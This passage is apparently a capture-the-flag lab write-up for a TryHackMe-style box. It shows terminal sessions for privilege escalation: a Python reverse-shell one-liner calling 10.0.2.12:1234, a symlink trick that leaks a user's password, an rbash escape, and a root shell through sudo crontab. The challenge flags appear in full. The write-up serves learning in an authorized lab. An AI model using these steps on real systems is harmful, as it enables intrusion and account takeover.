ls -lah
total 44K
drwxr-xr-x 7 backupmgr backupmgr 4.0K May 24  2020 .
drwxr-xr-x 4 root      root      4.0K May 10  2020 ..
lrwxrwxrwx 1 root      root         9 May 11  2020 .bash_history -> /dev/null
-rw-r--r-- 1 backupmgr backupmgr  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 backupmgr backupmgr 3.7K May 11  2020 .bashrc
drwx------ 2 backupmgr backupmgr 4.0K May 11  2020 .cache
drwxr-xr-x 3 nobody    nogroup   4.0K May 11  2020 .ftp
drwx------ 3 backupmgr backupmgr 4.0K May 11  2020 .gnupg
-rw-r--r-- 1 backupmgr backupmgr  807 May 11  2020 .profile
drwxr-xr-x 2 backupmgr backupmgr 4.0K May 18  2020 .scripts
-rw-rw-r-- 1 backupmgr backupmgr   75 May 11  2020 .selected_editor
drwxr-xr-x 2 backupmgr backupmgr 4.0K Jul 14 18:42 .tmp
backupmgr@tryharder:~$ cd .tmp
cd .tmp
backupmgr@tryharder:~/.tmp$ ls
ls
backup.tar.gz  script.sh
backupmgr@tryharder:~/.tmp$ cat script.sh
cat script.sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.12",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

backupmgr@tryharder:~/.tmp$ python -c "import pty;pty.spawn('/bin/bash')"
python -c "import pty;pty.spawn('/bin/bash')"

backupmgr@tryharder:~/.tmp$ cd /home/jeff
cd /home/jeff
bash: cd: /home/jeff: Permission denied

backupmgr@tryharder:~/.tmp$ find / -type f -user jeff 2>/dev/null
find / -type f -user jeff 2>/dev/null
/opt/systools/systool
/var/backups/jeff.bak

backupmgr@tryharder:~/.tmp$ cat /var/backups/jeff.bak
cat /var/backups/jeff.bak
cat: /var/backups/jeff.bak: Permission denied

backupmgr@tryharder:~/.tmp$ cd /opt/systools/
cd /opt/systools/
backupmgr@tryharder:/opt/systools$ ls
ls
message.txt  systool
backupmgr@tryharder:/opt/systools$ cat message.txt
cat message.txt
Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.

backupmgr@tryharder:/opt/systools$ ./systool
./systool
Welcome to Jeffs System Administration tool.
This is still a very beta version and some things are not implemented yet.
Please Select an option from below.
1 ) View process information.
2 ) Restore your password.
3 ) Exit 
Chose your option: 1
1
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.4 159780  8852 ?        Ss   17:28   0:04 /sbin/init mayb
root         2  0.0  0.0      0     0 ?        S    17:28   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   17:28   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   17:28   0:00 [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    17:28   0:00 [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    17:28   0:00 [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    17:28   0:00 [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    17:28   0:00 [migration/0]
root        11  0.0  0.0      0     0 ?        S    17:28   0:00 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    17:28   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    17:28   0:00 [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   17:28   0:00 [netns]
root        15  0.0  0.0      0     0 ?        S    17:28   0:00 [rcu_tasks_kthr
root        16  0.0  0.0      0     0 ?        S    17:28   0:00 [kauditd]
root        17  0.0  0.0      0     0 ?        S    17:28   0:00 [xenbus]
root        18  0.0  0.0      0     0 ?        S    17:28   0:00 [xenwatch]
root        19  0.0  0.0      0     0 ?        I    17:28   0:00 [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    17:28   0:00 [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    17:28   0:00 [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   17:28   0:00 [writeback]
root        23  0.0  0.0      0     0 ?        S    17:28   0:00 [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   17:28   0:00 [ksmd]
root        25  0.0  0.0      0     0 ?        SN   17:28   0:00 [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   17:28   0:00 [crypto]
root        27  0.0  0.0      0     0 ?        I<   17:28   0:00 [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   17:28   0:00 [kblockd]
root        29  0.0  0.0      0     0 ?        I<   17:28   0:00 [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   17:28   0:00 [md]
root        31  0.0  0.0      0     0 ?        I<   17:28   0:00 [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   17:28   0:00 [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   17:28   0:00 [watchdogd]
root        36  0.0  0.0      0     0 ?        S    17:28   0:00 [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   17:28   0:00 [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    17:28   0:00 [ecryptfs-kthre
root        80  0.0  0.0      0     0 ?        I<   17:28   0:00 [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   17:28   0:00 [acpi_thermal_p
root        82  0.0  0.0      0     0 ?        S    17:28   0:00 [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   17:28   0:00 [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    17:28   0:00 [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   17:28   0:00 [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   17:28   0:00 [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   17:28   0:00 [kstrp]
root       117  0.0  0.0      0     0 ?        I<   17:28   0:00 [charger_manage
root       181  0.0  0.0      0     0 ?        I<   17:28   0:00 [ttm_swap]
root       266  0.0  0.0      0     0 ?        I    17:28   0:00 [kworker/0:3]
root       274  0.0  0.0      0     0 ?        I<   17:28   0:00 [raid5wq]
root       327  0.0  0.0      0     0 ?        S    17:28   0:00 [jbd2/xvda2-8]
root       328  0.0  0.0      0     0 ?        I<   17:28   0:00 [ext4-rsv-conve
root       361  0.0  0.0      0     0 ?        I<   17:28   0:00 [kworker/0:1H]
root       402  0.0  0.7  94900 15304 ?        S<s  17:28   0:00 /lib/systemd/sy
root       422  0.0  0.0      0     0 ?        I<   17:28   0:00 [iscsi_eh]
root       424  0.0  0.0  97708  1716 ?        Ss   17:28   0:00 /sbin/lvmetad -
root       427  0.0  0.0      0     0 ?        I<   17:28   0:00 [ib-comp-wq]
root       428  0.0  0.0      0     0 ?        I<   17:28   0:00 [ib-comp-unb-wq
root       429  0.0  0.0      0     0 ?        I<   17:28   0:00 [ib_mcast]
root       430  0.0  0.0      0     0 ?        I<   17:28   0:00 [ib_nl_sa_wq]
root       484  0.0  0.0      0     0 ?        I<   17:28   0:00 [rdma_cm]
root       488  0.0  0.2  46808  5740 ?        Ss   17:28   0:01 /lib/systemd/sy
root       536  0.0  0.0      0     0 ?        S<   17:28   0:00 [loop0]
root       537  0.0  0.0      0     0 ?        S<   17:28   0:00 [loop1]
systemd+   717  0.0  0.1 141936  3344 ?        Ssl  17:28   0:00 /lib/systemd/sy
systemd+   803  0.0  0.2  80184  6024 ?        Ss   17:28   0:00 /lib/systemd/sy
systemd+   832  0.0  0.2  70640  5496 ?        Ss   17:28   0:00 /lib/systemd/sy
daemon     938  0.0  0.1  28332  2408 ?        Ss   17:28   0:00 /usr/sbin/atd -
root       951  0.0  0.2  62136  5788 ?        Ss   17:28   0:00 /lib/systemd/sy
root       952  0.0  0.3 286256  6856 ?        Ssl  17:28   0:00 /usr/lib/accoun
root       953  0.0  0.0 604940  1840 ?        Ssl  17:28   0:00 /usr/bin/lxcfs 
root       965  0.0  1.2 632804 25116 ?        Ssl  17:28   0:00 /usr/lib/snapd/
syslog     966  0.0  0.2 263036  4480 ?        Ssl  17:28   0:00 /usr/sbin/rsysl
root       968  0.0  0.8 169100 17088 ?        Ssl  17:28   0:00 /usr/bin/python
message+   981  0.0  0.2  50052  4664 ?        Ss   17:28   0:00 /usr/bin/dbus-d
root      1029  0.0  0.1  30028  3180 ?        Ss   17:28   0:00 /usr/sbin/cron 
root      1038  0.0  0.1  29148  2940 ?        Ss   17:28   0:00 /usr/sbin/vsftp
root      1044  0.0  2.0 681792 41724 ?        Ssl  17:28   0:01 /usr/bin/contai
root      1050  0.0  0.9 185944 20328 ?        Ssl  17:28   0:00 /usr/bin/python
root      1062  0.0  4.2 863916 87136 ?        Ssl  17:28   0:01 /usr/bin/docker
root      1074  0.0  0.3 291468  7288 ?        Ssl  17:28   0:00 /usr/lib/policy
root      1076  0.0  0.1  14664  2472 ttyS0    Ss+  17:28   0:00 /sbin/agetty -o
root      1193  0.0  0.0  14888  1968 tty1     Ss+  17:28   0:00 /sbin/agetty -o
root      1214  0.0  0.3  72300  6308 ?        Ss   17:28   0:00 /usr/sbin/sshd 
root      1258  0.0  0.0 141728  1592 ?        Ss   17:28   0:00 nginx: master p
www-data  1260  0.1  0.3 144024  7108 ?        S    17:28   0:08 nginx: worker p
root      1667  0.0  0.1 478532  3412 ?        Sl   17:29   0:00 /usr/bin/docker
root      1668  0.0  0.2  10772  4884 ?        Sl   17:29   0:00 containerd-shim
root      1684  0.0  0.2   9364  5640 ?        Sl   17:29   0:00 containerd-shim
999       1716  0.0 10.4 1116956 213508 ?      Ssl  17:29   0:02 mysqld
root      1723  0.0  1.6 238388 33712 ?        Ss   17:29   0:00 apache2 -DFOREG
www-data  2696 98.3  0.7 238476 14336 ?        R    18:10  35:31 apache2 -DFOREG
www-data  2697  0.0  0.4 238420  8200 ?        S    18:10   0:00 apache2 -DFOREG
www-data  2698  0.0  0.4 238420  8200 ?        S    18:10   0:00 apache2 -DFOREG
www-data  2699  0.0  0.4 238420  8200 ?        S    18:10   0:00 apache2 -DFOREG
www-data  2700  0.0  0.4 238420  8200 ?        S    18:10   0:00 apache2 -DFOREG
www-data  2701  0.0  0.4 238420  8200 ?        S    18:10   0:00 apache2 -DFOREG
www-data  2702  0.0  0.4 238420  8200 ?        S    18:10   0:00 apache2 -DFOREG
www-data  2703  0.0  0.0   2388   752 ?        S    18:11   0:00 sh -c sh
www-data  2704  0.0  0.0   2388   756 ?        S    18:11   0:00 sh
www-data  2712  0.0  0.0   2592  1836 ?        S    18:11   0:00 /usr/bin/script
www-data  2713  0.0  0.0   2388   756 pts/0    Ss   18:11   0:00 sh -c /bin/bash
www-data  2714  0.0  0.1   3868  3248 pts/0    S+   18:11   0:00 /bin/bash
root      2790  0.0  0.0      0     0 ?        I    18:18   0:00 [kworker/u30:2]
root      2940  0.0  0.0      0     0 ?        I    18:36   0:00 [kworker/u30:0]
root      2974  0.0  0.1  57500  3200 ?        S    18:39   0:00 /usr/sbin/CRON 
backupm+  2975  0.0  0.0   4628   920 ?        Ss   18:39   0:00 /bin/sh -c /hom
backupm+  2976  0.0  0.0   4628   804 ?        S    18:39   0:00 /bin/sh /home/b
backupm+  2978  0.0  0.1  28132  3072 ?        S    18:39   0:00 tar -czvf /home
backupm+  2979  0.0  0.0   4628   816 ?        S    18:39   0:00 /bin/sh -c gzip
backupm+  2980  0.0  0.0   4628   876 ?        S    18:39   0:00 /bin/sh -c sh r
backupm+  2981  0.0  0.0   4784   892 ?        S    18:39   0:00 gzip
backupm+  2982  0.0  0.0   4628   828 ?        S    18:39   0:00 sh rev.sh
backupm+  2983  0.0  0.4  45692  9872 ?        S    18:39   0:00 python -c impor
backupm+  2986  0.0  0.2  21220  4988 pts/0    Ss   18:39   0:00 /bin/bash
backupm+  3065  0.0  0.3  34724  7552 pts/0    S+   18:43   0:00 python -c impor
backupm+  3066  0.0  0.2  21224  5056 pts/1    Ss   18:43   0:00 /bin/bash
root      3100  0.0  0.0      0     0 ?        I    18:44   0:00 [kworker/u30:1]
backupm+  3157  0.0  0.0   4516   768 pts/1    S+   18:46   0:00 ./systool
backupm+  3158  0.0  0.0   4628   872 pts/1    S+   18:46   0:00 sh -c /bin/ps a
backupm+  3159  0.0  0.1  38372  3536 pts/1    R+   18:46   0:00 /bin/ps aux
1 ) View process information.
2 ) Restore your password.
3 ) Exit 
Chose your option: 2
2


Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.


1 ) View process information.
2 ) Restore your password.
3 ) Exit 

If we choose the second option (“restore your password”), it will display a message that seems to be taken from the `message.txt` file in the same directory, and that is writable by anybody:

backupmgr@tryharder:/opt/systools$ ls -lah
ls -lah
total 32K
drwxrwxrwx 2 jeff jeff  4.0K May 24  2020 .
drwxr-xr-x 4 root root  4.0K May 24  2020 ..
-rwxrwxrwx 1 root root   108 May 24  2020 message.txt
-rwxr-sr-x 1 jeff pwman  17K May 24  2020 systool

When used together, `ln -sf` creates a symbolic link forcefully, overriding any existing file or link with the same name

backupmgr@tryharder:/opt/systools$ ln -sf /var/backups/jeff.bak message.txt
ln -sf /var/backups/jeff.bak message.txt
backupmgr@tryharder:/opt/systools$ ./systool
./systool
Welcome to Jeffs System Administration tool.
This is still a very beta version and some things are not implemented yet.
Please Select an option from below.
1 ) View process information.
2 ) Restore your password.
3 ) Exit 
Chose your option: 2
2


Your Password is: 123-My-N4M3-1z-J3ff-123 


su jeff
Password: 123-My-N4M3-1z-J3ff-123

jeff@tryharder:/opt/systools$ which $SHELL
which $SHELL
/bin/rbash
jeff@tryharder:/opt/systools$ python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
jeff@tryharder:/opt/systools$ cd /home/jeff
cd /home/jeff
jeff@tryharder:~$ ls
ls
user.txt
jeff@tryharder:~$ cat user.txt
cat user.txt
THM{HashMeLikeOneOfYourFrenchGirls}

To obtain the MD5 hash of the string "HashMeLikeOneOfYourFrenchGirls" without including a newline character in the input

┌──(witty㉿kali)-[~/Downloads]
└─$ echo -n "HashMeLikeOneOfYourFrenchGirls" | md5sum

e122d5588956ef9ba7d4d2b2fee00cac

so

THM{e122d5588956ef9ba7d4d2b2fee00cac}

jeff@tryharder:~$ sudo -l
sudo -l
[sudo] password for jeff: 123-My-N4M3-1z-J3ff-123

Matching Defaults entries for jeff on tryharder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jeff may run the following commands on tryharder:
    (ALL) /usr/bin/crontab

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh jeff@jeff.thm -t "bash -l"         
The authenticity of host 'jeff.thm (10.10.114.83)' can't be established.
ED25519 key fingerprint is SHA256:ntoZ0jCo8d6CZYvZY+x1IDODIhSgNY02wPxLX0jxYTs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'jeff.thm' (ED25519) to the list of known hosts.
jeff@jeff.thm's password: 
jeff@tryharder:~$ which $SHELL
Command 'which' is available in the following places
 * /bin/which
 * /usr/bin/which
The command could not be located because '/bin:/usr/bin' is not included in the PATH environment variable.
which: command not found


- `-t`: This option forces a pseudo-terminal allocation, which is useful for running interactive shell sessions remotely.
- `"bash -l"`: The command to execute on the remote host after the SSH connection is established. In this case, it's running an interactive login shell (`bash -l`), which typically loads the user's profile and provides an interactive shell environment.



jeff@tryharder:~$ /usr/bin/sudo /usr/bin/crontab -e

# m h  dom mon dow   command


:!/bin/sh

# whoami
root
# bash -i
root@tryharder:/tmp# cd /root
root@tryharder:/root# ls
root.txt
root@tryharder:/root# cat root.txt
THM{40fc54e5c0f5747dfdd35e0cc7db6ee2}

Congratz on completing my box. 
Sorry if you hated it, it was my first one :)

The difference between `bash` and `bash -i` lies in the type of shell session that is launched.

- `bash`: When you simply run `bash` without any options, it starts a non-interactive shell session. This means that the shell is launched, but it does not provide an interactive environment. It won't read the user's `.bashrc` or `.bash_profile` files, and it won't show a prompt for commands. It is commonly used for running shell scripts or executing commands in a non-interactive manner.
    
- `bash -i`: On the other hand, when you run `bash -i`, it starts an interactive shell session. The `-i` option stands for "interactive." This type of shell session is designed to provide an interactive environment for the user. It reads the user's initialization files like `.bashrc` or `.bash_profile`, sets up the shell environment variables, and displays a prompt where the user can enter commands and interact with the shell in real-time.
    

In summary, `bash` without the `-i` option starts a non-interactive shell, while `bash -i` starts an interactive shell. The choice depends on whether you need an interactive environment with a prompt and initialization files or simply want to execute commands non-interactively.

```


Hack the machine and obtain the user.txt flag.

*THM{e122d5588956ef9ba7d4d2b2fee00cac}*

Escalate your privileges, whats the root flag?

*THM{40fc54e5c0f5747dfdd35e0cc7db6ee2}*


[[CMSpit]]